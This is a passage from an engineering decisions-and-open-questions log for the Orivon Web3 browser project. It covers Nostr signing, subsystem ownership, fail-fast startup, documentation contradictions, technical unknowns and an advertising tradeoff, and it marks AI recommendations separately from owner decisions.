secp256k1 scalar for `('identity', identityId)` and its x-only public key; (3) produce a 64-byte
BIP-340 Schnorr signature over the id; (4) return `{...event, id, pubkey, sig}`. Nothing in this
lane's code assumes which layer does (2)-(3), or whether `IdentityHandle.signEvent` re-derives
`screenEvent`'s table (`kind-screening.ts`) independently rather than trusting this module's
`hint` parameter — it must, per that file's own header.

**Secondary, resolved rather than escalated:** I considered whether `OrivonId.requestIdentity`'s
or `IdentityHandle.signEvent`'s existing signatures can carry what a Nostr signer needs (the
brief flagged this as a real candidate to stop on). I concluded they do: `signEvent(event:
object)` already receives the whole structured event including `kind`, so a broker-side
implementation can derive its own screening decision without any `src/contracts/` change. Not
filed as a separate blocking question; recorded here and in the PR body as an AI recommendation
in case the owner disagrees.

**Needed by:** before `orivon.id`'s `'secp256k1'` curve can back a real Nostr identity — nothing
in `src/nostr/` can sign a real event until this exists. Not blocking this PR: this lane's whole
surface is built and tested against an injected stub per the owner's explicit decision (brief's
Scope, item 6).

### A47 — `registry.ts` is shell-owned and "maintenance only"; this branch edited it anyway **[STILL OPEN]**

Found 2026-09-03, fixing `stream/broker-15-reachable`'s `publishBroker` overwrite gap.

`parallel-work.md`'s ownership map gives `src/main/` to the `shell` stream, and
`src/main/README.md` says so explicitly for `registry.ts` itself: "Maintenance only; other
streams add themselves via `subsystems.ts` rather than editing here." This branch adds
`publishBroker` to `registry.ts` from outside the shell stream, and the sanctioned append point
— `subsystems.ts` — is untouched, because what this branch needed was a second write path onto
`SubsystemContext`, not a new list entry.

The change itself is additive (a new exported function, a doc-comment rewrite) and low-risk, and
the PR discloses the crossing. What makes it worth recording rather than waving through is that
it is **precedent-setting, not one-off**: `src/shim/`, `src/trust/` and `src/nostr/` will each
need to read the same `ctx.broker` this branch just made safely writable, and today the only
pattern available to any of them is "edit `registry.ts` too" — there is no second legal way in.

Two shapes an answer could take:

1. **A second sanctioned append point inside `registry.ts` itself**, alongside `subsystems.ts`'s
   existing one. `parallel-work.md` would name a class of change to `registry.ts` — a new
   optional `SubsystemContext` field plus its own `publishX`-shaped guarded setter, following
   the pattern this branch just established — as an APPEND other streams may make directly,
   distinct from an EDIT to `runBeforeReady`/`runAfterReady` themselves, which stays shell-owned.
   This gives the pattern a name and a place to find it without cross-referencing an unrelated
   entry, and lets `parallel-work.md` state up front what "additive" is allowed to mean here,
   before three streams each guess differently.
2. **Fold this into A31.** A31 already asks whether a non-`backlog-NN` stream branch may edit a
   `docs`-owned file it must keep in step with its own signature change, and proposes extending
   the borrow carve-out on a case-by-case, name-it-in-the-PR-body basis. This is the same shape
   one level down: a stream branch needing to touch a **code** file it does not own, to extend a
   primitive (`ctx.broker`) that the branch itself did not invent but must interoperate with.
   Answering A31 for code as well as docs would resolve both with one decision rather than two.

**Leaning, not a decision:** (2) costs less right now — it reuses a carve-out the owner may
already be inclined to grant rather than asking for a new mechanism to be designed. (1) costs
more up front but scopes the boundary precisely, which matters more here than it does for docs:
a docs edit that goes stale is a wrong sentence, but three streams independently deciding what
counts as an "additive" edit to a shared context object is exactly the kind of drift
`registry.ts`'s own header says the subsystem-registry pattern exists to prevent. Whichever
shape, this should be settled before `shim/`, `trust/` or `nostr/` each hit the same wall and
pick their own answer.

**Needed by:** before the next stream needs to read `ctx.broker` — plausibly `src/shim/` or
`src/trust/`, whichever build step reaches a real grant path first. Not blocking this PR.

### A51 — a critical subsystem now fails startup loudly; is fail-fast the right shape long-term **[AI-REC]**

Found 2026-09-03, in a three-persona adversarial review of `stream/broker-15-reachable`
(A47's own branch). `publishBroker`'s throw was caught by `runAfterReady`'s failure collection
and demoted to one `console.error` line (`main/index.ts`'s `report()`); the app then booted a
completely normal-looking shell window with the control channel never registered, so every
`orivon.*` call from every app was silently unroutable. The change had turned a silent *data*
bug (two disagreeing grant ledgers) into a silent *availability* bug (the capability layer going
dark) — an improvement, but still invisible exactly where `runBeforeReady`'s own "must never be
quiet" philosophy says it must not be.

**Fixed on `stream/broker-17-ctx-broker`:** `Subsystem` gained an optional `critical` flag
(`registry.ts`), copied onto each `SubsystemFailure`; `brokerIpcSubsystem` (`src/broker/ipc.ts`)
is the first subsystem marked `critical: true`. `main/index.ts` now calls the new
`criticalFailureMessage(failures)` after each phase and, if it returns non-null, calls
`dialog.showErrorBox` and `app.exit(1)` instead of calling `createShellWindow()` — a browser
whose capability layer is dead does not open at all, rather than opening one that only looks
like it works.

**What is decided vs. still open.** That a critical subsystem's failure must be impossible to
miss is not in question. What is an AI recommendation, not an owner decision:

1. **Fail-fast + native dialog, not a degraded mode.** An alternative considered and rejected:
   open the shell window anyway with an in-page banner (e.g. a chrome-view indicator saying
   capabilities are unavailable), which would at least let a user retry a normal tab. Rejected
   here because the shell chrome itself is rendered by ordinary web content with no special
   authority to assert "the broker is down" trustworthily, and because a half-working browser
   that silently denies every `orivon.*` call is arguably a worse experience than one that
   visibly refuses to start. Not tested against real users either way.
2. **`dialog.showErrorBox` + `app.exit(1)`, not a friendlier recovery flow** (retry, a link to
   diagnostics, an automatic restart). Chosen as the smallest change that makes the failure
   impossible to miss, per this task's own brief — not because a better UX doesn't exist.
3. **Only `brokerIpcSubsystem` is marked `critical` today.** Whether a future `src/shim/` or
   `src/trust/` subsystem should also be critical is for whoever builds it to decide, following
   this pattern (`Subsystem.critical`'s own doc in `registry.ts`) rather than reinventing one.

**Related to A47, not a duplicate:** A47 asks who may edit `registry.ts` at all; this asks
whether the failure-handling shape chosen inside it, once editable, is the right one long-term.

**Needed by:** before packaging (build step 10), when a real user first sees this dialog instead
of a console line. Not blocking — the behaviour is strictly louder than what it replaces either
way.

---

## B. Contradictions still to fix

### B2. What does DDOC stand for?
Three expansions across three documents, one of them public: *Domain Data Ownership
**Confirmation*** (`orivon.mdx`), *Domain Data Ownership **Certification***
(`Posts/Technical Specifications`), ***Data Domain** Ownership Certification* (`Glossario`).
Trivial to fix; needs one canonical form in `glossary.md`.

### B3. Two different trustlessity ladders — RESOLVED, public docs need updating
Public `web3-score.md` gives websites **4** levels; private `Web3 Verification levels` gives
**5**, including *"full-stack runs entirely locally"* as L3 — a level that vanished publicly
even though local-executability is central to the "installable Web3sites" argument.

→ `ADR-0006` resolves this **in favour of the private version**: "runs entirely locally" is
reinstated, and it is automatically decidable. **Action outstanding: correct the public docs**
to reinstate that level and to mark which levels are automatic versus judged. The `+Privacy`
placement (L4 publicly, L5 privately) still needs one canonical answer.

### B4. Zero-setup auto-connecting accounts — resolved, with a validation correction
`La Piramide dei Pilastri` and `OrivonBook` both state that accounts are pre-installed with
no setup and auto-connect to sites.

**Correction found in the validation pass:** the first resolution ("per-origin keys only, no
cross-origin linkage, NIP-07 as first consumer") was **internally contradictory** — a Nostr
identity must be the *same* across every client site, or follows and posts fragment per
client. Nobody caught this until the validation read.

**Corrected model** (`capability-api.md`): silent **per-origin app keys** for apps, plus
**named identities** that are cross-origin *by explicit consent* — a per-site connect prompt,
revocable. NIP-07 rides the named-identity path, not the per-origin path. A funds-bearing
wallet remains a separate, setup-requiring thing named differently in the UI.
**Still open:** the exact UI language distinguishing throwaway keys / named identities /
wallets.

---

## C. Technical unknowns

### C1. DDOC's trust root is DNS — worth anything on ICANN domains? **[RESEARCH]**
Deferred with A4b. Also unexamined: `Glossario`'s claim that DDOC justifies **self-signed
HTTPS** on compliant sites. That needs hard scrutiny before it is repeated publicly.

### C2. DDOC's unlisted-file rule looks unsound **[RESEARCH]**
`Archivio/Struttura Stack` argues a file absent from the hash-tree is nevertheless valid
because the load chain started from an owned root. Implemented literally, any page induced to
fetch an unlisted resource escapes DDOC entirely — defeating the stated goal of detecting
server compromise. Needs a strict-mode rule.

### C3. Capability API open items **[AI-REC]**
Listed at the end of `architecture/capability-api.md`: whether `net.listen` is grantable to
unsigned apps; whether grants are keyed per origin or per origin + manifest version; whether
`fs.quotaBytes` is enforced or advisory.

### C4. NIP-07 injection conformance **[RESEARCH — cheap]**
The ~1 day Nostr estimate assumes existing clients accept an injected `window.nostr` cleanly.
Verify against two or three real clients before treating the estimate as settled. Licences
also need checking per client — several are AGPL.

### C5. Reuse-vs-build not yet analysed **[RESEARCH]**
Outstanding for: ENS resolution, IPFS (embedded vs. Kubo subprocess vs. gateway), the DDOC
generator. Settled for: WASM host (deferred), Electron shell (build, do not fork), torrent
engine (`webtorrent` library), Nostr (inject NIP-07, reuse third-party clients).

### C6. Playwright `_electron` fails to attach to one window — cause unknown **[RESEARCH]**
Found during the week-0 spike (gate 3, video playback). A direct, non-Playwright launch of the
app loads and plays normally — confirmed via `dom-ready`/`did-finish-load` firing and matching
renderer console output to every other gate. Launched through Playwright's `_electron.launch()`
then `app.firstWindow()`, the call times out after 30s. Playwright's own CDP session to the
main process is healthy (`DEBUG=pw:electron,pw:browser` shows the browser-level DevTools
connection succeeding), but no target-created event for the window is ever logged — so this
looks like an Electron/Chromium CDP auto-attach issue, not a Playwright installation problem.
Six causes ruled out (full trail: `planning/spike-results/gate-3.json`); the `<video>` element
and a raw-CDP-client test remain untried. **Matters because `build-plan.md`'s single
highest-value automated test (the capability-rejection e2e) uses the identical `_electron`
driver** — not confirmed affected (gates 0/1a/1b/4 all attach fine on the same driver), but
worth a five-minute check the first time that test is written, before build step 2 is called
done on the strength of it.

**Narrowed 2026-08-26, build step 1.** A minimal `BaseWindow` with two `WebContentsView`s
(one chrome-style view, one content view — the exact composition the shell now uses)
attaches cleanly under `_electron`: `app.windows()` reports both with correct URLs, and
`app.firstWindow()` resolves immediately with no timeout, in view-add order. **So the failure
is not `BaseWindow`/multiple-`WebContentsView`s in general** — it is specific to something in
gate 3's actual composition (video element, service worker, or the
`protocol.registerSchemesAsPrivileged()` call, none of which this probe exercised). Practical
consequence for the shell: `app.firstWindow()` is not reliable long-term (it depends on
view-add order, which is an implementation detail, not a contract) — the shell's own smoke
test matches windows by URL/title via `app.windows()` instead of relying on first-added
ordering.

---

## BB. Public-docs corrections — and what is *not* one

**The MVP being narrower than the vision is not a contradiction.** It is expected, and nothing
in `mvp-scope.md`'s non-goals implies the final product is limited the same way. Those
non-goals are MVP-scoped only.

Only genuine errors belong here — statements wrong **independently of the MVP**:

| # | Correction | MVP-only? |
|---|---|---|
| 1 | `orivon.mdx`: *"bitcoind … would be **already** runnable as a site on Orivon"* states a future goal in the present tense. **Fix the tense, keep the ambition.** | **Yes, scoping** — but the tense makes it read as a current property, and it is the first claim a technical evaluator will test |
| 2 | `web3-score.md` is missing the site level *"full stack runs entirely locally"*, which is real and automatically detectable (`ADR-0006`) | **No** — it would be missing from the final product too |
| 3 | `roadmap.mdx` does not reflect that trustless resolution is a **prerequisite** for DDOC and site-level scores. DDOC anchors in a DNS record, forgeable on ICANN domains without DNSSEC | **No** — a permanent dependency in the final architecture |
| 4 | DDOC expansion differs across three documents (`glossary.md`, B2) | **No** |

Owner-side work. Not blocking the MVP, but worth doing before it draws attention.

---

## CC. Accepted tradeoffs

Decided, not open. Recorded so the reasoning is visible later rather than rediscovered.

### Advertising priced by trustlessity level
**Owner's decision.** Ad priority and price key to trustlessity level (`economical-strategy.md`):
lower level ⇒ higher price and lower priority. A deliberate penalty on centralised entrants and
a subsidy to decentralised ones — a tax on centralisation, not a sale of trust.

**Owner's reasoning, in full:**
1. Orivon is ultimately a for-profit company. It is incentivised to grow the ecosystem toward
   trustless solutions through sponsorship, but also to accept non-trustless sponsors when the
   money is materially better — because that money funds further innovation for Web3. A
   rational trade for the ecosystem's benefit, even if it sounds bad.
2. A score provider is incentivised to score accurately, because being trusted is the entire
   point of it. Trustlessness and security are what give the provider its value.

**AI counter-position, recorded once and then dropped.** Point 2 is correct in isolation, but
it does not address point 1 — the two are separate claims, and the difficulty is their
intersection: Orivon scoring the entities that pay Orivon.

The empirical record on reputation as discipline is specific: it holds when the scorer is *not*
paid by the scored, and fails when it is, independent of intent.
- Moody's and S&P rated CDOs AAA while paid by issuers; the "our reputation protects you"
  argument was made explicitly and publicly, and failed. Both remain profitable.
- Arthur Andersen and Enron: same structure, same outcome.
- EasyList, not paid by advertisers, has held its reputation for two decades. Eyeo's
  Acceptable Ads, which took payment for whitelisting, is distrusted in exactly the community
  Orivon targets.

The mechanism is not bad actors: reputation damage is slow and diffuse, revenue is immediate
and concentrated, and that asymmetry compounds.

On point 1 specifically, the objection is **timing, not principle**. Brave is the direct
precedent — ads, BAT, profitable — and was badly damaged by the 2020 affiliate-link injection
over small money, with precisely this audience. It survived because it already had millions of
users. At 100 users reputation *is* the whole asset, with no product moat to absorb a hit. The
strategy becomes survivable once there is something to lose that is not reputation.

**Mitigation available at zero revenue cost** (recorded, not a condition): price ads from a
*third-party* provider's attestations rather than Orivon's own. This removes the self-dealing
while keeping the pricing model exactly as intended. `ADR-0006` makes it nearly free, since
attestations are portable signed statements over bundle hashes.

**Unaffected and independently sound:** charging for *faster evaluation*. `ADR-0006` shows
attestation lag is real friction, so reducing it is a legitimate paid service.

**Status: owner-decided, post-MVP, reversible. Not to be re-raised.**

---

## D. Parked (post-MVP)
Dashboard widget grid · App store · Web3 search · Wallet Crypto/Address-book layers and
`CapabilityDescriptor` · Mobile · DAO / tokenomics · Proxy chains and VPN mode · Client
Profile separation · DDOC · Trustless resolution · `subprocess` and `hid` capabilities ·
Identity export/backup · Cross-device sync.

### A25 -- the documented example of an unparseable version is parseable **[AI-REC]**

Found while implementing `loader/manifest.ts` (2026-08-27) and verified directly against the
real `compareVersions`/`parseVersion`.

`architecture/capability-api.md` and `src/broker/policy/update.ts`'s own comment both offer
`"2026-08-26"` as the example of a version string that cannot be ordered, and therefore fails
closed at update time. **It parses.** Hyphens are legal in a semver prerelease identifier, so
`2026-08-26` reads as major `2026` with prerelease `08-26` and orders against other versions
without complaint.

The *rule* is unaffected -- unorderable versions should still be rejected at first install, and
`loader/manifest.ts` does that. Only the example is wrong.

**AI recommendation:** replace the example in both places with something genuinely unorderable
(`"v1.0"`, `"latest"`, `"1.0.0.0"`). A wrong example in a specification is worse than none: the
next person writes a test asserting `2026-08-26` is rejected, watches it fail, and concludes the
implementation is broken.

**Needed by:** whoever next touches version handling. Not blocking.

### A26 -- three port-range parsers **[AI-REC]**

`connect-patterns.ts` exports one, `update.ts` keeps a private one, and `loader/manifest.ts`
added a third (2026-08-27). Each was written because neither of the others was legally reusable
from where it stood -- `policy/` may not import from `loader/`, and `update.ts`'s is private to
a decision function that must not grow a dependency on pattern matching.

This is the shape `CLAUDE.md` Rule 3 exists to catch, and the codebase has already done one
dedupe pass for exactly this. The reasons are individually sound, which is how three of
something appears without anyone deciding to have three.

**AI recommendation:** move the port-range grammar into `src/shared/`, which exists precisely
for a helper needed on both sides of a boundary, is change-controlled like contracts, imports
nothing, and is currently empty. The audit that created it concluded nothing crossed that
boundary yet. Something does now.

**Needed by:** before a fourth appears. Not blocking.
